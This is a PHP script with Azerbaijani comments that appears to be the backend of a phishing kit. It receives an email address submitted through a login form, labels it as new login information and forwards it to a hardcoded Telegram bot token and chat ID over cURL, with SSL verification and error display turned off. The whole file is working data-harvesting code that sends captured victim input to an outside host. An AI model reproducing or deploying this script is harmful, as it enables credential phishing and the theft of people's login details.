<?php
// PHP-də xəta hesabatını deaktiv etmək (isteğe bağlı)
error_reporting(0);
ini_set('display_errors', 0);

// ❗ Sizin Telegram Məlumatlarınız - Bu hissə server tərəfində gizli qalır ❗
$botToken = '8568408364:AAGcM6PJORlgQIsW48hmV3jdtqBIEog7PMY'; 
$chatId = '6307157806'; 

// Sorğunun POST metodu ilə gəldiyini və 'email' dəyərinin olduğunu yoxlayırıq
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['email'])) {
    
    // Email adresini alırıq və təhlükəsizlik üçün təmizləyirik
    $email = htmlspecialchars($_POST['email']);
    
    // Telegram üçün mesajı formalaşdırırıq
    $message = "📧 Yeni Login Məlumatı 📧\n\nEmail address: " . $email;
    
    // Telegram API URL
    $apiUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

    // Göndəriş üçün parametrlər
    $params = array(
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML', // Mesajı HTML formatında göndərmək üçün
    );

    // cURL istifadə edərək Telegram API ilə əlaqə qururuq
    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // Cavabı geri al
    curl_setopt($ch, CURLOPT_POST, 1);           // POST metodu
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params); // Parametrləri göndər
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // SSL yoxlanışını bəzən deaktiv etmək lazım olur
    
    $result = curl_exec($ch);
    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Telegramdan gələn cavab statusunu yoxlayırıq
    if ($http_status == 200) {
        // Uğurlu cavab
        http_response_code(200); 
    } else {
        // Xəta, məsələn, Bot Token və ya Chat ID səhvdirsə
        http_response_code(500); // Internal Server Error
        // Həqiqi xətanı serverin log faylına yaz
        error_log("Telegram API Error Code: " . $http_status . " Response: " . $result);
    }

} else {
    // Əgər POST sorğusu düzgün gəlməyibsə
    http_response_code(405); // Method Not Allowed
}
?>
